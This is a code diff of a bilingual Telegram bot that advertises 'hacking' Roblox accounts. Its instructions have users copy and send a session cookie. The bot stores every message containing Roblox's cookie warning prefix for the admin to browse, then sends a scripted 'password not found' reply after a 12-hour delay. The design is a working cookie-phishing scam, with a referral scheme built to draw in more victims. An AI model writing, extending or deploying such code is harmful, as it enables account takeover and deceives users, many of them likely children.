@@ -13,7 +13,6 @@ YOUR_USER_ID = 1341594703
 
 # ⚠️ НАСТРОЙКИ ПОДПИСКИ
 REQUIRED_CHANNEL = "@reviewsh1pe"
-CHANNEL_ID = None
 
 # ===================================================
 # ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
@@ -34,26 +33,19 @@ KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log
 
 TRANSLATIONS = {
     "ru": {
-        # Выбор языка
         "choose_language": "🌐 **Выберите язык для использования бота:**\n\nВыберите язык, на котором вы хотите общаться с ботом.",
         "language_changed": "✅ Язык изменен на Русский!",
         "change_language": "🌐 Сменить язык",
-        
-        # Главное меню
         "bot_start": "Привет, {name}! 👋\n\n🎯 **У тебя {attempts} бесплатная попытка взлома**\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\nВыбери нужную категорию:",
         "back_to_menu": "◀️ Назад в меню",
         "device": "Взломать аккаунт",
         "cookies": "Инструкция",
         "referral": "👥 Пригласить друга",
         "buy_roblox": "💰 Купить Roblox",
-        
-        # Подписка
         "check_subscription": "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
         "not_subscribed": "❌ **Вы ещё не подписались на канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
         "subscribe_button": "📢 ПОДПИСАТЬСЯ НА КАНАЛ",
         "subscribed_button": "✅ Я ПОДПИСАЛСЯ",
-        
-        # Админские кнопки
         "all_users": "👥 Все пользователи",
         "keyword_users": "🔑 С ключевым словом",
         "stats": "📊 Статистика",
@@ -64,14 +56,8 @@ TRANSLATIONS = {
         "send_message_to_user": "✉️ Отправить сообщение пользователю",
         "message_sent_to_user": "✅ Сообщение отправлено пользователю!",
         "message_from_admin": "📩 Сообщение от администратора:",
-        
-        # Блок покупки Roblox
         "buy_roblox_title": "💎 **КУПИТЬ ROBLOX** 💎\n\n💰 Хотите приобрести Robux или любую вещь в Roblox?\n\n📩 **Свяжитесь с нами:**\n👤 @h1peoff\n\n⚡ Быстрое оформление\n💳 Безопасная оплата\n🎁 Лучшие цены\n\nНапишите нам прямо сейчас! 🚀",
-        
-        # Реферальная система
         "referral_text": "👥 **Пригласи друга и получи +1 попытку!**\n\n🎯 Твои попытки: {attempts}\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\n📎 **Твоя реферальная ссылка:**\n`{link}`\n\n📋 **Как это работает:**\n1. Отправь ссылку другу\n2. Друг переходит по ссылке и запускает бота\n3. Ты получаешь +1 попытку взлома\n\n⚠️ Важно: друг должен быть новым пользователем!",
-        
-        # Устройства
         "device_choice": "🎯 **У тебя {attempts} попытка взлома осталась**\n\nВыбери своё устройство:",
         "phone": "📱 Телефон",
         "computer": "💻 Компьютер",
@@ -82,14 +68,10 @@ TRANSLATIONS = {
         "cookies_sent": "Скинь cookie в бота\nИ бот начнет поиск пароля вашей жертвы😈\nВ течении 12 часов бот скинет вам пароль от аккаунта",
         "cookies_copied": "Скопировал куки ✅",
         "back": "◀️ Вернуться",
-        
-        # Ответы на сообщения
         "keyword_received": "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n🎯 Осталось попыток: {remaining}\n\nНе создавайте повторных заявок, иначе будете заблокированы\nЕсли в течении 12 часов бот не ответил, значит он не нашел пароль от аккаунта",
         "message_received": "Ваше сообщение получено. Ожидайте результат.",
         "wrong_cookie": "Пожалуйста, отправьте правильный cookie для продолжения.",
         "delayed_message": "Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы.",
-        
-        # Админские сообщения
         "admin_stats": "📊 **СТАТИСТИКА БОТА:**\n\n👥 Всего пользователей: {total_users}\n🔑 С ключевым словом: {keyword_users}\n📩 Сообщений сохранено: {messages}\n📅 Новых сегодня: {today}",
         "no_users": "📭 Никто ещё не заходил в бота.",
         "no_keyword_users": "📭 Нет пользователей, отправивших ключевое слово.",
@@ -97,8 +79,6 @@ TRANSLATIONS = {
         "keyword_users_title": "🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
         "no_messages": "📭 У пользователя {name} (@{username}) пока нет сообщений.",
         "no_keyword_messages": "📭 У {name} (@{username}) нет сообщений с ключевым словом.",
-        
-        # Удаление
         "delete_users_menu": "🗑 **Управление пользователями:**\n\nВыберите действие:",
         "delete_single_user": "🗑 Удалить одного пользователя",
         "delete_all_users": "🗑 Удалить всех пользователей",
@@ -109,8 +89,6 @@ TRANSLATIONS = {
         "yes_delete": "✅ Да, удалить",
         "cancel": "❌ Отмена",
         "confirm_delete_all": "⚠️ ДА, УДАЛИТЬ ВСЕХ",
-        
-        # Выдача попыток
         "give_attempts_menu": "🎯 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ВЫДАЧИ ПОПЫТОК:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
         "give_attempts_user": "🎯 **Выдача попыток пользователю:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Текущее количество попыток: {attempts}\n\nВыберите сколько попыток выдать:",
         "give_attempts_success": "✅ **Попытки успешно выданы!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Добавлено: {count} попыток\n🎯 Теперь попыток: {new_attempts}",
@@ -123,8 +101,6 @@ TRANSLATIONS = {
         "invalid_number": "❌ Количество должно быть больше 0!",
         "enter_number": "❌ Пожалуйста, отправьте число!",
         "attempts_canceled": "❌ Выдача попыток отменена.",
-        
-        # Рассылка
         "mailing_menu": "📨 **Выберите кому отправить рассылку:**\n\n⚠️ Сообщение будет отправлено после того, как вы его напишете.",
         "mailing_all": "📨 Всем пользователям",
         "mailing_keyword": "🔑 Только с ключевым словом",
@@ -134,8 +110,6 @@ TRANSLATIONS = {
         "mailing_no_users": "❌ Нет пользователей для рассылки.",
         "mailing_start": "⏳ Начинаю рассылку для {count} пользователей...",
         "mailing_success": "✅ **Рассылка завершена!**\n\n📤 Отправлено: {sent}\n❌ Не доставлено: {failed}\n👥 Всего: {total}",
-        
-        # Чат
         "chat_select_user": "💬 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
         "chat_title": "💬 **Чат с {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего сообщений: {total}\n\n",
         "chat_keyword_title": "🔑 **Cookie от {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего: {total} сообщений\n\n",
@@ -144,32 +118,23 @@ TRANSLATIONS = {
         "show_all": "📋 Показать ВСЕ сообщения полностью",
         "show_more": "... и ещё {count} сообщений",
         "send_msg_to_user": "✉️ Отправить сообщение этому пользователю",
-        
-        # Кнопки навигации
         "prev": "◀️ Назад",
         "next": "Вперед ▶️",
     },
     "en": {
-        # Выбор языка
         "choose_language": "🌐 **Choose your language:**\n\nSelect the language you want to use the bot in.",
         "language_changed": "✅ Language changed to English!",
         "change_language": "🌐 Change language",
-        
-        # Главное меню
         "bot_start": "Hello, {name}! 👋\n\n🎯 **You have {attempts} free hacking attempts**\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\nChoose a category:",
         "back_to_menu": "◀️ Back to menu",
         "device": "Hack account",
         "cookies": "Instructions",
         "referral": "👥 Invite a friend",
         "buy_roblox": "💰 Buy Roblox",
-        
-        # Подписка
         "check_subscription": "⚠️ **You must subscribe to our channel to use the bot!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
         "not_subscribed": "❌ **You haven't subscribed to the channel yet!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
         "subscribe_button": "📢 SUBSCRIBE TO CHANNEL",
         "subscribed_button": "✅ I SUBSCRIBED",
-        
-        # Админские кнопки
         "all_users": "👥 All users",
         "keyword_users": "🔑 With keyword",
         "stats": "📊 Statistics",
@@ -180,11 +145,8 @@ TRANSLATIONS = {
         "send_message_to_user": "✉️ Send message to user",
         "message_sent_to_user": "✅ Message sent to user!",
         "message_from_admin": "📩 Message from administrator:",
-        
         "buy_roblox_title": "💎 **BUY ROBLOX** 💎\n\n💰 Want to buy Robux or any item in Roblox?\n\n📩 **Contact us:**\n👤 @h1peoff\n\n⚡ Fast processing\n💳 Secure payment\n🎁 Best prices\n\nContact us now! 🚀",
-        
         "referral_text": "👥 **Invite a friend and get +1 attempt!**\n\n🎯 Your attempts: {attempts}\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\n📎 **Your referral link:**\n`{link}`\n\n📋 **How it works:**\n1. Send the link to a friend\n2. Friend clicks the link and starts the bot\n3. You get +1 hacking attempt\n\n⚠️ Important: friend must be a new user!",
-        
         "device_choice": "🎯 **You have {attempts} hacking attempts left**\n\nChoose your device:",
         "phone": "📱 Phone",
         "computer": "💻 Computer",
@@ -195,12 +157,10 @@ TRANSLATIONS = {
         "cookies_sent": "Send the cookie to the bot\nAnd the bot will start searching for your victim's password😈\nWithin 12 hours the bot will send you the account password",
         "cookies_copied": "Cookies copied ✅",
         "back": "◀️ Back",
-        
         "keyword_received": "Great, our bot has started searching for your victim's password.\n🎯 Attempts left: {remaining}\n\nDon't create duplicate requests or you'll be blocked\nIf the bot doesn't respond within 12 hours, it means the password wasn't found",
         "message_received": "Your message has been received. Waiting for results.",
         "wrong_cookie": "Please send a valid cookie to continue.",
         "delayed_message": "Sorry, we couldn't find the password for your account. Don't create a duplicate request, try again in 7 days or you'll be blocked.",
-        
         "admin_stats": "📊 **BOT STATISTICS:**\n\n👥 Total users: {total_users}\n🔑 With keyword: {keyword_users}\n📩 Messages saved: {messages}\n📅 New today: {today}",
         "no_users": "📭 No users have used the bot yet.",
         "no_keyword_users": "📭 No users have sent the keyword.",
@@ -208,7 +168,6 @@ TRANSLATIONS = {
         "keyword_users_title": "🔑 **USERS WITH KEYWORD:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
         "no_messages": "📭 User {name} (@{username}) has no messages yet.",
         "no_keyword_messages": "📭 {name} (@{username}) has no messages with keyword.",
-        
         "delete_users_menu": "🗑 **User Management:**\n\nChoose an action:",
         "delete_single_user": "🗑 Delete one user",
         "delete_all_users": "🗑 Delete all users",
@@ -219,7 +178,6 @@ TRANSLATIONS = {
         "yes_delete": "✅ Yes, delete",
         "cancel": "❌ Cancel",
         "confirm_delete_all": "⚠️ YES, DELETE ALL",
-        
         "give_attempts_menu": "🎯 **SELECT USER TO GIVE ATTEMPTS:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
         "give_attempts_user": "🎯 **Giving attempts to user:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Current attempts: {attempts}\n\nChoose how many attempts to give:",
         "give_attempts_success": "✅ **Attempts successfully given!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Added: {count} attempts\n🎯 Now has: {new_attempts} attempts",
@@ -232,7 +190,6 @@ TRANSLATIONS = {
         "invalid_number": "❌ The number must be greater than 0!",
         "enter_number": "❌ Please send a number!",
         "attempts_canceled": "❌ Attempts giving canceled.",
-        
         "mailing_menu": "📨 **Select who to send the mailing to:**\n\n⚠️ The message will be sent after you write it.",
         "mailing_all": "📨 All users",
         "mailing_keyword": "🔑 Only with keyword",
@@ -242,7 +199,6 @@ TRANSLATIONS = {
         "mailing_no_users": "❌ No users for mailing.",
         "mailing_start": "⏳ Starting mailing for {count} users...",
         "mailing_success": "✅ **Mailing completed!**\n\n📤 Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {total}",
-        
         "chat_select_user": "💬 **SELECT USER:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
         "chat_title": "💬 **Chat with {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total messages: {total}\n\n",
         "chat_keyword_title": "🔑 **Cookies from {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total: {total} messages\n\n",
@@ -251,7 +207,6 @@ TRANSLATIONS = {
         "show_all": "📋 Show ALL messages completely",
         "show_more": "... and {count} more messages",
         "send_msg_to_user": "✉️ Send message to this user",
-        
         "prev": "◀️ Back",
         "next": "Next ▶️",
     }
@@ -911,14 +866,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # ✅ СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ СРАЗУ ПРИ ЗАПУСКЕ
     save_all_user(
         user_id=user_id,
         username=user.username or "no_username",
         first_name=user.first_name or "Unknown"
     )
     
-    # Проверяем, есть ли у пользователя выбранный язык
+    # Проверяем реферальную ссылку
+    if context.args and context.args[0].startswith("ref_"):
+        referrer_id = context.args[0].replace("ref_", "")
+        if referrer_id and str(referrer_id) != str(user_id):
+            add_referral(int(referrer_id), user_id)
+    
     if not os.path.exists(LANGUAGE_FILE) or str(user_id) not in json.load(open(LANGUAGE_FILE, "r", encoding="utf-8")) if os.path.exists(LANGUAGE_FILE) else True:
         await language_selection(update, context)
         return
@@ -933,14 +892,12 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # ✅ ОБНОВЛЯЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
     save_all_user(
         user_id=user_id,
         username=user.username or "no_username",
         first_name=user.first_name or "Unknown"
     )
     
-    # Проверяем подписку для обычных пользователей
     if user_id != YOUR_USER_ID:
         is_subscribed = await check_subscription(user_id, context)
         if not is_subscribed:
@@ -1026,10 +983,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.edit_message_text("✅ Language changed to English!")
         
-        # Показываем главное меню после выбора языка
         user_name = update.effective_user.first_name
         
-        # Проверяем подписку
         if user_id != YOUR_USER_ID:
             is_subscribed = await check_subscription(user_id, context)
             if not is_subscribed:
@@ -1048,7 +1003,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_main_menu_by_query(query, context, user_id)
         return
     
-    # --- СМЕНА ЯЗЫКА (ТОЛЬКО В ГЛАВНОМ МЕНЮ) ---
+    # --- СМЕНА ЯЗЫКА ---
     if data == "change_language":
         keyboard = [
             [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
@@ -1114,7 +1069,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
+    # --- КНОПКА ВЗЛОМАТЬ АККАУНТ (НЕ ТРАТИТ ПОПЫТКУ) ---
     if data == "device":
         if user_id != YOUR_USER_ID:
             is_subscribed = await check_subscription(user_id, context)
@@ -1162,23 +1117,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # ===================================================
-    # ИСПРАВЛЕННЫЕ ОБРАБОТЧИКИ ДЛЯ ТЕЛЕФОНА И КОМПЬЮТЕРА
-    # ===================================================
+    # --- ТЕЛЕФОН (НЕ ТРАТИТ ПОПЫТКУ) ---
     elif data == "phone":
-        # Используем попытку пользователя при выборе устройства
-        if not use_attempt(user_id):
-            keyboard = [
-                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
-                [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await query.edit_message_text(
-                get_text(user_id, "no_attempts"),
-                reply_markup=reply_markup
-            )
-            return
-        
         keyboard = [
             [
                 InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
@@ -1196,20 +1136,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.delete_message()
         return
     
+    # --- КОМПЬЮТЕР (НЕ ТРАТИТ ПОПЫТКУ) ---
     elif data == "computer":
-        # Используем попытку пользователя при выборе устройства
-        if not use_attempt(user_id):
-            keyboard = [
-                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
-                [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await query.edit_message_text(
-                get_text(user_id, "no_attempts"),
-                reply_markup=reply_markup
-            )
-            return
-        
         keyboard = [
             [
                 InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
@@ -1228,10 +1156,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "back_to_device":
-        # Возврат к выбору устройства (без повторного использования попытки)
         attempts = get_user_attempts(user_id)
         
-        # Проверяем, есть ли у пользователя попытки
         if attempts <= 0:
             keyboard = [
                 [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
@@ -1505,7 +1431,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(get_text(user_id, "mailing_keyword_text"))
         return
     
-    # Все пользователи (постраничный вывод)
+    # Все пользователи
     elif data == "view_all_users":
         await show_users_page(query, context, 0)
         return
@@ -1515,7 +1441,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_users_page(query, context, page)
         return
     
-    # Только с ключевым словом (постраничный вывод)
+    # Только с ключевым словом
     elif data == "view_keyword_users_only":
         await show_keyword_users_page(query, context, 0)
         return
@@ -1550,7 +1476,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Выбор пользователя для чата (постраничный вывод)
+    # Выбор пользователя для чата
     elif data == "select_user_for_chat":
         await show_chat_users_page(query, context, 0)
         return
@@ -1560,7 +1486,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_chat_users_page(query, context, page)
         return
     
-    # Просмотр сообщений с ключевым словом (постраничный вывод)
+    # Просмотр сообщений с ключевым словом
     elif data == "view_keyword_messages":
         await show_keyword_messages_page(query, context, 0)
         return
@@ -1571,7 +1497,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # ===================================================
-    # ЧАТ С ПОЛЬЗОВАТЕЛЕМ - ВСЕ СООБЩЕНИЯ
+    # ЧАТ С ПОЛЬЗОВАТЕЛЕМ
     # ===================================================
     elif data.startswith("chat_user_"):
         target_user_id = data.replace("chat_user_", "")
@@ -1621,9 +1547,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
     
-    # ===================================================
-    # ВСЕ СООБЩЕНИЯ ПОЛНОСТЬЮ (без обрезки)
-    # ===================================================
     elif data.startswith("chat_user_full_"):
         target_user_id = data.replace("chat_user_full_", "")
         all_users = get_all_users()
@@ -1668,9 +1591,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
     
-    # ===================================================
-    # ТОЛЬКО КЛЮЧЕВЫЕ СЛОВА
-    # ===================================================
     elif data.startswith("chat_user_keyword_"):
         target_user_id = data.replace("chat_user_keyword_", "")
         all_users = get_all_users()
@@ -1760,7 +1680,6 @@ async def show_main_menu_by_query(query, context, user_id):
     attempts = get_user_attempts(user_id)
     referrals = get_referral_count(user_id)
     
-    # ✅ ОБНОВЛЯЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
     save_all_user(
         user_id=user_id,
         username=user.username or "no_username",
@@ -1917,8 +1836,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         first_name=user.first_name or "Unknown"
     )
     
-    # Обычная обработка сообщений (не рассылка)
+    # ===================================================
+    # ГЛАВНОЕ: ПОПЫТКА ТРАТИТСЯ ТОЛЬКО ЗДЕСЬ - ПРИ ОТПРАВКЕ КЛЮЧЕВОГО СЛОВА
+    # ===================================================
     if KEYWORD in user_message:
+        # ПРОВЕРЯЕМ И ТРАТИМ ПОПЫТКУ
         if not use_attempt(user_id):
             keyboard = [
                 [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
@@ -2021,6 +1943,7 @@ def main():
     print("🎯 У каждого пользователя 1 бесплатная попытка")
     print("👥 За каждого приглашенного друга +1 попытка")
     print("⏰ Задержка перед ответом: 12 часов")
+    print("✅ Попытка тратится ТОЛЬКО при отправке ключевого слова (cookie)")
     print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
     print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
     print("🎯 Для выдачи попыток нажми кнопку 'Выдать попытки' в меню")
